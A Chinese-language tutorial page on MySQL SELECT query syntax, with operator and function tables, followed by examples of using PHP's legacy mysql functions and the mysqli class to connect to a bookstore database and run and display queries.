<h4 id="DISTINCT关键字的使用"><a href="#DISTINCT关键字的使用" class="headerlink" title="DISTINCT关键字的使用"></a>DISTINCT关键字的使用</h4><p>在使用SELECT语句返回的记录结构中包含重复的记录，可以使用DISTINCT关键字取消重复的数据，只返回一个。DISTINCT关键字的作用范围是整个查询的列表，而不是单独的一列。同时对两列数据进行查询时，使用了DISTINCT关键字，将返回这两列数据的唯一组合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT DISTINCT idFROM table;			#取消id列中重复的数据。</div></pre></td></tr></table></figure></p>
<p>使用DISTINCT关键字可以返回简单、明了的数据，但服务器必须话费更多的时间去执行对查询结果的分类和整理。与DISTINCT相对应的是ALL关键字，用于返回满足SELECT语句条件的所有记录。</p>
<h4 id="在SELECT语句中使用表达式的列"><a href="#在SELECT语句中使用表达式的列" class="headerlink" title="在SELECT语句中使用表达式的列"></a>在SELECT语句中使用表达式的列</h4><p>在SQL语句中，表达式可用于一些诸如SELECT语句的ORDER BY或HAVING子句、SELECT、DELETE或UPDATE语句的WHERE子句或SET语句之类的地方。使用文本值、column值、NULL值、函数、操作符来书写表达式。主要包括算术表达式、逻辑表达式，以及使用SQL函数表达式。<br>在SELECT语句中使用表达式重新对数据列进行计算。</p>
<h4 id="使用WHERE子句按条件检索"><a href="#使用WHERE子句按条件检索" class="headerlink" title="使用WHERE子句按条件检索"></a>使用WHERE子句按条件检索</h4><p>在SELECT语句中，可以使用WHERE子句指定搜索条件，实现从数据表中检索出符合条件的记录。其中，搜索条件可以由一个或多个逻辑表达式组成，这些表达式指定关于某一记录是真或假的条件。在WHERE子句中，可以通过逻辑操作符和比较操作符和比较操作符指定基本的表达式条件。</p>
<h5 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h5><table>
<thead>
<tr>
<th>操作符</th>
<th style="text-align:left">语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND或&amp;&amp;</td>
<td style="text-align:left">a AND b或a &amp;&amp; b</td>
<td>逻辑与</td>
</tr>
<tr>
<td>OR或//</td>
<td style="text-align:left">a OR b或a // b</td>
<td>逻辑或</td>
</tr>
<tr>
<td>XOR</td>
<td style="text-align:left">a XOR b</td>
<td>逻辑异或</td>
</tr>
<tr>
<td>NOT或！</td>
<td style="text-align:left">NOT a或！a</td>
<td>逻辑非</td>
</tr>
</tbody>
</table>
<h5 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h5><table>
<thead>
<tr>
<th>操作符</th>
<th style="text-align:left">语法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>IS NULL</td>
<td style="text-align:left">a IS NULL</td>
<td>若操作数a为NULL，则为真</td>
</tr>
<tr>
<td>IS NOT NULL</td>
<td style="text-align:left">a IS NOT NULL</td>
<td>若操作数a不为NULL，则为真</td>
</tr>
<tr>
<td>BETWEEN</td>
<td style="text-align:left">a BETWEEN b AND c</td>
<td>若a在b和c之间（包括b和c），则为真</td>
</tr>
<tr>
<td>NOT BETWEEN</td>
<td style="text-align:left">a NOT BETWEEN b AND c</td>
<td>若a不在b和c之间（包括b和c），则为真</td>
</tr>
<tr>
<td>LIKE</td>
<td style="text-align:left">a LIKE b</td>
<td>SQL模式匹配，若a匹配b，则为真</td>
</tr>
<tr>
<td>NOT LIKE</td>
<td style="text-align:left">a NOT LIKE b</td>
<td>SQL模式匹配，若a不匹配b，则为真</td>
</tr>
<tr>
<td>IN</td>
<td style="text-align:left">a IN(b1,b2,b3,…)</td>
<td>若a等于b1,b2,b3,…中的某一个，则为真</td>
</tr>
</tbody>
</table>
<h4 id="根据空值（NULL）确定检索条件"><a href="#根据空值（NULL）确定检索条件" class="headerlink" title="根据空值（NULL）确定检索条件"></a>根据空值（NULL）确定检索条件</h4><p>空值只能定义在允许NULL字段中出现，NULL值是特殊的值，代表“无值”，与0和空字符串（”）都不相同。当在不支持默认值的字段中未输入值，或在字段中显式的设置为空，就会出现空值，但不能用处理已知值的方式来出来NULL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT*FROM books WHERE detail IS NOT NULL;		#查找不为空的数据</div></pre></td></tr></table></figure></p>
<h4 id="使用BETWEEN-AND进行范围比较查询"><a href="#使用BETWEEN-AND进行范围比较查询" class="headerlink" title="使用BETWEEN AND进行范围比较查询"></a>使用BETWEEN AND进行范围比较查询</h4><p>需要对某个字段通过范围的值进行比较查询，可以使用BETWEEN AND关键字实现，其中AND是多重条件符号，比较时也包括边界条件。也可以使用”&gt;=”和”=&lt;”完成相同的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT name,price FROM books WHERE price BETWEEN 30 AND 80;</div><div class="line">SELECT name,price FROM books WHERE price &gt;= 30 AND price &lt;=80;</div></pre></td></tr></table></figure></p>
<h4 id="使用IN进行范围比较查询"><a href="#使用IN进行范围比较查询" class="headerlink" title="使用IN进行范围比较查询"></a>使用IN进行范围比较查询</h4><p>在WHERE子句中，使用IN关键字并在后面的括号”（）”中提供一个值的列表，以供与相应的字段进行比较。该列表中至少应该存在一个值，如果有多个值可以使用逗号”，”分隔。</p>
<h4 id="使用LIKE进行模糊查询"><a href="#使用LIKE进行模糊查询" class="headerlink" title="使用LIKE进行模糊查询"></a>使用LIKE进行模糊查询</h4><p>在SELECT语句的WHERE子句中，可以使用LIKE关键字对数据表中的记录进行模糊查询，将查询结果锁定在一个范围内。在查询条件中通常会与”_”和”%”两个通配符一起使用，可以实现复制的检索查询。</p>
<ul>
<li>百分号”%”：表示0个或任意多个字符。</li>
<li>下划线”_”：表示单个的任意一个字符。</li>
</ul>
<h4 id="多表查询（连接查询）"><a href="#多表查询（连接查询）" class="headerlink" title="多表查询（连接查询）"></a>多表查询（连接查询）</h4><ul>
<li>非等值和等值的多表查询<br>多表查询和普通的单表查询相似，都是使用SELECT语句。只不过在多表查询时需要把多张表的名字，全部填写在FROM子句中，并用逗号”，”将表名分开。同时，也可以对数据表使用别名进行引用。为了在查询时区分多个表中出现的重复字段名，可以在字段列表中使用”表名.列名”的形式，如果不存在重名的列，可以省略表名。</li>
<li>自身连接查询<br>连接查询操作不仅可以用于多个表之间，也可以是一个表与其自己进行拼接，称为自身连接查询。当一个表所代表的实体之间有关系时，就可以使用自身连接查询。</li>
<li>复合连接查询<br>在FROM子句后面有n个表需要查询，则在WHERE子句中就需要有多个连接条件。至少要比出现的表格数量少一个，也就是不能少于n-1个查询条件，多个条件使用”AND”关键词连接即可。</li>
</ul>
<h4 id="嵌套查询（子查询）"><a href="#嵌套查询（子查询）" class="headerlink" title="嵌套查询（子查询）"></a>嵌套查询（子查询）</h4><p>嵌套查询是在一个SELECT语句的WHERE子句中，包含另一个SELECT语句，也可以称为子查询。在子查询中只能返回一列，并将形成的结果又作为父查询的条件，在主句中进行一布查询。SQL允许多层嵌套查询，嵌套查询的求解方法是由里向外处理，即每个子查询都是在上一级查询处理之前求解，子查询的结果用于建立其父查询的查找条件。</p>
<h4 id="使用ORDER-BY对查询结果排序"><a href="#使用ORDER-BY对查询结果排序" class="headerlink" title="使用ORDER BY对查询结果排序"></a>使用ORDER BY对查询结果排序</h4><p>在SELECT语句中使用ORDER BY子句，对检索的结果进行排序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT id,name FROM books ORDER BY id DESC;</div></pre></td></tr></table></figure></p>
<p>ORDER BY后面可以接一列或多列用于排序的字段，并且使用DESC或ASC关键字设计字段排序的方式。默认情况下按照升序排列，即使用ASC关键字。否则要按照降序排列，必须使用DESC关键字。ORDER BY子句可以和SELECT语句中的其他子句一起使用，但在子查询中不能哟ORDER BY子句，因为ORDER BY子句只能对最终查询结果排序。</p>
<h4 id="使用LIMIT限定结构行数"><a href="#使用LIMIT限定结构行数" class="headerlink" title="使用LIMIT限定结构行数"></a>使用LIMIT限定结构行数</h4><p>LIMIT子句可以和其他的SELECT子句一起使用，它可以指定两个参数，分别用以设置返回记录的起始位置，和返回记录的数量。</p>
<h4 id="使用统计函数"><a href="#使用统计函数" class="headerlink" title="使用统计函数"></a>使用统计函数</h4><table>
<thead>
<tr>
<th>统计函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>COUNT()</td>
<td style="text-align:left">返回满足SELECT语句中指定条件的记录数，例如，COUNT（*）返回找到的记录行数</td>
</tr>
<tr>
<td>SUM()</td>
<td style="text-align:left">通常为数值字段或表达列作统计，返回一列的总和</td>
</tr>
<tr>
<td>AVG()</td>
<td style="text-align:left">通常为数值字段或表达列作统计，返回一列的平均值</td>
</tr>
<tr>
<td>MAX()</td>
<td style="text-align:left">可以为数值字段、字符字段或表达列作统计，返回一列中最大的值</td>
</tr>
<tr>
<td>MIN()</td>
<td style="text-align:left">可以为数值字段、字符字段或表达列统计，返回一列中最小的值</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT 函数名 （列名1或*）, ...函数名 （列名n） FROM 表名;		#使用统计函数</div></pre></td></tr></table></figure>
<h4 id="使用GROUP-BY对查询结构分组"><a href="#使用GROUP-BY对查询结构分组" class="headerlink" title="使用GROUP BY对查询结构分组"></a>使用GROUP BY对查询结构分组</h4><p>GROUP BY子句将表按列值分组，列的值相同的分为一组。如果GROUP BY后面有多个列名，则先按第一个列名分组，再在每组中按第二个列名分组。</p>
<h2 id="使用PHP脚本向MySQL服务器发送SQL"><a href="#使用PHP脚本向MySQL服务器发送SQL" class="headerlink" title="使用PHP脚本向MySQL服务器发送SQL"></a>使用PHP脚本向MySQL服务器发送SQL</h2><h3 id="在PHP脚本中连接MySQL服务器"><a href="#在PHP脚本中连接MySQL服务器" class="headerlink" title="在PHP脚本中连接MySQL服务器"></a>在PHP脚本中连接MySQL服务器</h3><p>PHP可以通过MySQL功能模块去连接MySQL服务器，办法是调用mysql_connect()函数，和使用MySQL客户机程序连接MySQL服务器类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource mysql_connect([string server[,string username[,string password[,bool new_link[,int client_flags]]]]])</div></pre></td></tr></table></figure></p>
<p>通常只要提供前三个参数即可，包括MySQL服务器的主机名、MySQL用户名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;mysql_pass&quot;);			//使用PHP程序连接MySQL服务器</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_password&quot;) or die(&quot;连接失败: &quot;.mysql_error());</div><div class="line">    echo &quot;与MySQL服务器建立的连接成功:&lt;br&gt;&quot;;          //连接成功则会输出这条提示信息</div><div class="line">    echo mysql_get_client_info();                          //客户端API函数库的版本信息</div><div class="line">    echo mysql_get_host_info();                           //与MySQL服务器的连接类型</div><div class="line">    echo mysql_get_proto_info();                          //通信协议的版本信息</div><div class="line">    echo mysql_get_server_info();                         //MySQL服务器的版本信息</div><div class="line">    echo mysql_client_encoding();                         //客户端使用的默认字符集</div><div class="line">    echo mysql_stat();                                   //MySQL服务器的当前工作状态</div><div class="line">    mysql_close($link);                                  //关闭与MySQL服务器建立的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="在PHP程序中选择已创建的数据库"><a href="#在PHP程序中选择已创建的数据库" class="headerlink" title="在PHP程序中选择已创建的数据库"></a>在PHP程序中选择已创建的数据库</h3><p>为了避免每次调用PHP的mysql扩展函数时都指定目录数据库，最好先用mysql_select_db()函数为后续操作选定一个默认数据库，这个函数和SQL命令“USE bookstore”功能相似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_password&quot;) or die(&quot;连接失败: &quot;.mysql_error());</div><div class="line">	mysql_select_db(&apos;bookstore&apos;,$link)or die(&apos;不能选定数据库：&apos;.mysql_error());</div><div class="line">	mysql_close($link);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="执行SQL命令"><a href="#执行SQL命令" class="headerlink" title="执行SQL命令"></a>执行SQL命令</h3><p>在PHP脚本中，只要把SQL命令作为一个字符串传递给mysql_query函数，就会将其发送到MySQL服务器中并执行。如果想访问的不是当前数据库，就需要调用mysql_db_query()函数来执行SQL命令并明确地给出数据库的名字。这两个函数的最后一个参数都是可选的，即mysql_connect()函数返回的连接标识号，只要在与同一个MySQL服务器建立多条连接的时候才必须给出这个参数。<br>mysql_query()函数可以用来执行DDL、DML、DQL及DCL等任何一种SQL命令，如果想执行一条以上的SQL命令，就需要为它们分别调用一次mysql_query()函数。如果SQL命令执行成功，mysql_query()函数将返回一个非0值。如果没有执行不成功，该函数将返回FALSE（即数值0），并会生成一条出错信息，出错原因可以利用mysql_errno()和mysql_error()函数来确定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pass&quot;) or die(&quot;连接失败: &quot;.mysql_error());</div><div class="line">    //为后续的mysql扩展函数的操作选定一个默认的数据库，它相当于SQL命令use bookstore</div><div class="line">    mysql_select_db(&apos;bookstore&apos;) or die (&apos;不能选定数据库 bookstore : &apos; . mysql_error());</div><div class="line">   </div><div class="line">    //将插入3条的INSERT语句声明为一个字符串 </div><div class="line">    $insert=&quot;INSERT INTO books(bookName, publisher, author, price, detail) VALUES</div><div class="line">	    (&apos;PHP&apos;, &apos;电子工业&apos;, &apos;高某某&apos;, &apos;80.00&apos;, &apos;与PHP相关的图书&apos;),</div><div class="line">	    (&apos;JSP&apos;, &apos;人民邮电&apos;, &apos;洛某某&apos;, &apos;50.00&apos;, &apos;与JSP相关的图书&apos;),</div><div class="line">	    (&apos;ASP&apos;, &apos;电子工业&apos;, &apos;峰某某&apos;, &apos;30.00&apos;, &apos;与ASP相关的图书&apos;)&quot;;</div><div class="line"></div><div class="line">    //使用mysql_query()函数发送INSERT语句，如果成功返回TRUE，失败则返回FALSE</div><div class="line">    $result=mysql_query($insert);          </div><div class="line">    if($result &amp;&amp; mysql_affected_rows()&gt;0)&#123;</div><div class="line">	    echo &quot;数据记录插入成功，最后一条插入的数据记录ID为：&quot;.mysql_insert_id().&quot;&lt;br&gt;&quot;;</div><div class="line">    &#125;else&#123;</div><div class="line">	    echo &quot;插入记录失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">    //执行UPDATE命令修改表books中的一条记录，将图书名为PHP的记录价格修改为79.90</div><div class="line">    $result1=mysql_query(&quot;UPDATE books SET price=&apos;79.9&apos; WHERE bookName=&apos;PHP&apos;&quot;);</div><div class="line">    if($result1 &amp;&amp; mysql_affected_rows()&gt;0)&#123;</div><div class="line">	    echo &quot;数据记录修改成功&lt;br&gt;&quot;;</div><div class="line">    &#125;else&#123;</div><div class="line">	    echo &quot;修改数据失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">    //执行DELETE命令删除表books中图书名为JSP的记录</div><div class="line">    $result2=mysql_query(&quot;DELETE FROM books WHERE bookName=&apos;JSP&apos;&quot;);</div><div class="line">    if($result2 &amp;&amp; mysql_affected_rows()&gt;0)&#123;</div><div class="line">	    echo &quot;数据记录删除成功&lt;br&gt;&quot;;</div><div class="line">    &#125;else&#123;</div><div class="line">	    echo &quot;删除数据失败，错误号：&quot;.mysql_errno().&quot;，错误原因：&quot;.mysql_error().&quot;&lt;br&gt;&quot;;</div><div class="line">    &#125;</div><div class="line">    mysql_close($link);                               //关闭与MySQL服务器建立的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="在PHP脚本中处理SELECT查询结果集"><a href="#在PHP脚本中处理SELECT查询结果集" class="headerlink" title="在PHP脚本中处理SELECT查询结果集"></a>在PHP脚本中处理SELECT查询结果集</h3><p>在PHP脚本中执行SELECT查询命令，也是调用mysql_query()函数，但和执行DML不同的是，执行SELECT命令之后mysql_query()函数的返回值是一个PHP资源的引用指针（结果集）。这个返回值可以用在各种结果集处理函数中，对结果数据包的各个字段进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$result=mysql_query(&quot;SELECT * FROM books&quot;);			//执行SELECT语句返回结果集资源$result</div><div class="line">$rows=mysql_num_rows($result);			//从结果几种获得数据记录行的个数</div><div class="line">$cols=mysql_num_fields($result);		//从结果中获得数据记录列的个数</div></pre></td></tr></table></figure></p>
<ul>
<li>mysql_fetch_row():该函数将一条结构记录返回并以一个普通索引数组的形式保存。</li>
<li>mysql_fetch_assoc():该函数将一条结果记录返回并以一个普通关联数组的形式保存。</li>
<li>mysql_fetch_array():该函数可以将结果数据表中的每一行获取为一个关联数组或索引数组，或者同时获取为关联和索引数组。可以通过为该函数传递MYSQL_ASSOC、MYSQL_NUM或MYSQL_BOTH中的一个常量返回不同的数组形态，默认使用MYSQL_BOTH常量将两种数组一起返回。</li>
<li>mysql_fetch_object():该函数将以一个对象的形式返回一条结果记录，它的各个字段需要以对象的方式进行访问。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $link=mysql_connect(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pass&quot;) or die(&quot;连接失败: &quot;.mysql_error());</div><div class="line">    mysql_select_db(&apos;bookstore&apos;) or die (&apos;不能选定数据库 bookstore : &apos; . mysql_error());</div><div class="line">   </div><div class="line">    //执行DQL命令返回结果集$result</div><div class="line">    $result=mysql_query(&quot;select bookId, bookName, author, publisher,price,detail from books&quot;);           </div><div class="line">    echo &apos;&lt;table align=&quot;center&quot; width=&quot;80%&quot; border=&quot;1&quot;&gt;&apos;;   //以HTML表格输出结果</div><div class="line">    echo &apos;&lt;caption&gt;&lt;h1&gt;图书信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;      //输出表格标题</div><div class="line">    echo &apos;&lt;th&gt;编号&lt;/th&gt;&lt;th&gt;图书名&lt;/th&gt;&lt;th&gt;作者&lt;/th&gt;&lt;th&gt;出版社&lt;/th&gt;&lt;th&gt;价格&lt;/th&gt;&lt;th&gt;介绍&lt;/th&gt;&apos;;</div><div class="line">    while($row=mysql_fetch_row($result))&#123;               //循环从结果集中遍历每条记录到数组中</div><div class="line">	    echo &apos;&lt;tr&gt;&apos;;                                  //每遍历一条记录输出一个行标记</div><div class="line">	    foreach($row as $data)&#123;                        //循环遍历一条数据记录中的每个字段</div><div class="line">	    	      echo &apos;&lt;td&gt;&apos;.$data.&apos;&lt;/td&gt;&apos;;                 //以表格形式输出每个字段</div><div class="line">	    &#125;</div><div class="line">	    echo &apos;&lt;/tr&gt;&apos;;                                  //输出每行的结束标记</div><div class="line">    &#125;</div><div class="line">    echo &apos;&lt;/table&gt;&apos;;</div><div class="line">    mysql_free_result($result);                          //释放查询的结果集资源</div><div class="line">    mysql_close($link);                                //关闭与MySQL服务器建立的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="PHP的mysqli扩展"><a href="#PHP的mysqli扩展" class="headerlink" title="PHP的mysqli扩展"></a>PHP的mysqli扩展</h1><h2 id="启用mysqli扩展模块"><a href="#启用mysqli扩展模块" class="headerlink" title="启用mysqli扩展模块"></a>启用mysqli扩展模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extension=php_mysqli.dll			//在php.ini文件中启动这一行</div></pre></td></tr></table></figure>
<p>mysqli扩展不仅提供了mysql模块的所有功能，也相应地增加了一些新特征。mysqli扩展模块包括mysqli、mysqli_result和mysqli_stmt三个类，通过这三个类的使用，就可以连接MySQL数据库服务器和选择数据库、查询和获取数据，以及使用预处理语句简化了重复执行的查询语句。</p>
<h2 id="使用mysqli类"><a href="#使用mysqli类" class="headerlink" title="使用mysqli类"></a>使用mysqli类</h2><h3 id="mysqli类中的成员方法"><a href="#mysqli类中的成员方法" class="headerlink" title="mysqli类中的成员方法"></a>mysqli类中的成员方法</h3><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>_construct()</td>
<td style="text-align:left">构造方法，用于创建一个新的mysqli对象，也可以建立一个连接</td>
</tr>
<tr>
<td>autocommit()</td>
<td style="text-align:left">开启或关闭数据库修改自动提交</td>
</tr>
<tr>
<td>change_user</td>
<td style="text-align:left">改变了数据库连接所指定的用户</td>
</tr>
<tr>
<td>caracter_set_name()</td>
<td style="text-align:left">返回数据库连接默认的字符集</td>
</tr>
<tr>
<td>close()</td>
<td style="text-align:left">关闭先前打开连接</td>
</tr>
<tr>
<td>commit()</td>
<td style="text-align:left">提交当前的事务</td>
</tr>
<tr>
<td>connect()</td>
<td style="text-align:left">打开一个新的连接到MySQL数据库服务器</td>
</tr>
<tr>
<td>debug()</td>
<td style="text-align:left">执行调试操作</td>
</tr>
<tr>
<td>dump_debug_info()</td>
<td style="text-align:left">转储调试信息</td>
</tr>
<tr>
<td>get_client_info()</td>
<td style="text-align:left">返回客户端版本</td>
</tr>
<tr>
<td>get_host_info()</td>
<td style="text-align:left">返回一个字符串代表的连接使用类型，如：Localhost via UNIX socket</td>
</tr>
<tr>
<td>get_server_info()</td>
<td style="text-align:left">返回MySQL服务器的版本</td>
</tr>
<tr>
<td>get_server_version()</td>
<td style="text-align:left">返回整数形式的MySQL服务器版本</td>
</tr>
<tr>
<td>init()</td>
<td style="text-align:left">初始化MySQLi并返回一个资源</td>
</tr>
<tr>
<td>info()</td>
<td style="text-align:left">检索有关最近执行的查询</td>
</tr>
<tr>
<td>kill()</td>
<td style="text-align:left">要求服务器去杀死一个MySQL线程</td>
</tr>
<tr>
<td>multi_query()</td>
<td style="text-align:left">执行多个查询语句</td>
</tr>
<tr>
<td>more_results()</td>
<td style="text-align:left">从多查询语句中检查是否有任何更多的查询结果</td>
</tr>
<tr>
<td>Next_result()</td>
<td style="text-align:left">从当前执行的多查询中读取下一个结果</td>
</tr>
<tr>
<td>options()</td>
<td style="text-align:left">设置选项</td>
</tr>
<tr>
<td>ping()</td>
<td style="text-align:left">如果没有连接，ping一台服务器连接或重新连接</td>
</tr>
<tr>
<td>prepare()</td>
<td style="text-align:left">准备一个SQL语句的执行，返回mysqli_stmt对象</td>
</tr>
<tr>
<td>query()</td>
<td style="text-align:left">与数据库的任何交互都是通过查询进行的，该方法向数据库发送查询来执行</td>
</tr>
<tr>
<td>real_connect()</td>
<td style="text-align:left">试图打开一个连接到MySQL数据库服务器</td>
</tr>
<tr>
<td>escape_string()</td>
<td style="text-align:left">转义特殊字符的字符串，用于在一个SQL语句，并考虑到当前的字符集的连接</td>
</tr>
<tr>
<td>rollback()</td>
<td style="text-align:left">回滚当前的事务</td>
</tr>
<tr>
<td>select_db()</td>
<td style="text-align:left">为数据库查询选择默认的数据库</td>
</tr>
<tr>
<td>set_charset()</td>
<td style="text-align:left">设置默认客户端字符集</td>
</tr>
<tr>
<td>ssl_set()</td>
<td style="text-align:left">使用SSL用于建立安全连接</td>
</tr>
<tr>
<td>stat()</td>
<td style="text-align:left">获取当前的系统状态</td>
</tr>
<tr>
<td>stmt_init()</td>
<td style="text-align:left">初始化一个声明，并返回一个mysqli_stmt对象</td>
</tr>
<tr>
<td>store_result()</td>
<td style="text-align:left">从最后查询中转让结果集</td>
</tr>
<tr>
<td>thread_safe()</td>
<td style="text-align:left">是否考虑返回安全的线程</td>
</tr>
</tbody>
</table>
<h3 id="mysqli类中的成员属性"><a href="#mysqli类中的成员属性" class="headerlink" title="mysqli类中的成员属性"></a>mysqli类中的成员属性</h3><table>
<thead>
<tr>
<th>成员属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$affect_rows</td>
<td style="text-align:left">在前一个MySQL操作中获取影响的行数</td>
</tr>
<tr>
<td>$client_info</td>
<td style="text-align:left">MySQL客户端版本为一个字符串返回</td>
</tr>
<tr>
<td>$client_version</td>
<td style="text-align:left">MySQL客户端版本为一个整数返回</td>
</tr>
<tr>
<td>$errno</td>
<td style="text-align:left">返回最近函数调用的错误代码</td>
</tr>
<tr>
<td>$error</td>
<td style="text-align:left">返回最近函数调用的错误信息字符串</td>
</tr>
<tr>
<td>$field_count</td>
<td style="text-align:left">传回最近查询获取的列数</td>
</tr>
<tr>
<td>$host_info</td>
<td style="text-align:left">返回一个字符串的连接类型使用</td>
</tr>
<tr>
<td>$info</td>
<td style="text-align:left">检索有关最近执行的查询</td>
</tr>
<tr>
<td>$insert_id</td>
<td style="text-align:left">返回使用最后查询自动生成的编号</td>
</tr>
<tr>
<td>$protocal_version</td>
<td style="text-align:left">返回MySQL协议使用的版本</td>
</tr>
<tr>
<td>$sqlstate</td>
<td style="text-align:left">返回一个字符串包含SQLSTATE错误码的最后一个错</td>
</tr>
<tr>
<td>$thread_id</td>
<td style="text-align:left">为当前连接返回线程ID</td>
</tr>
<tr>
<td>$warning_count</td>
<td style="text-align:left">返回前一个SQL语句执行过程中产生的警告数量</td>
</tr>
</tbody>
</table>
<h3 id="连接MySQL服务器"><a href="#连接MySQL服务器" class="headerlink" title="连接MySQL服务器"></a>连接MySQL服务器</h3><p>通过mysqli类的构造方法实例化对象，其构造方法的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">class mysqli&#123;</div><div class="line">	__construct ([string host[,string username[,string passwd[,string dbname[,int port[,string socket]]]]]])</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个构造方法还有两个可选的参数：MySQL服务器的端口号、一个套接字文件或命名管道。但是这两个可选参数很少使用。</p>
<p>如果连接成功，该构造方法将返回一个mysqli对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;,&quot;mylib&quot;);		//连接MySQL数据库服务器</div></pre></td></tr></table></figure></p>
<p>如果在创建mysqli对象没有想构造方法传入连接参数，就需要多写几行代码，调用mysqli对象中的connect()方法连接MySQL数据库服务器，还可以使用select_db()方法特别指定数据库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php	</div><div class="line">	$mysqli=new mysqli();			//创建mysqli对象</div><div class="line">	$mysqli-&gt;connect(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;);			//连接指定的MySQL数据库服务器</div><div class="line">	$mysqli-&gt;select_db(&quot;mylib&quot;);				//选择特定的数据库</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
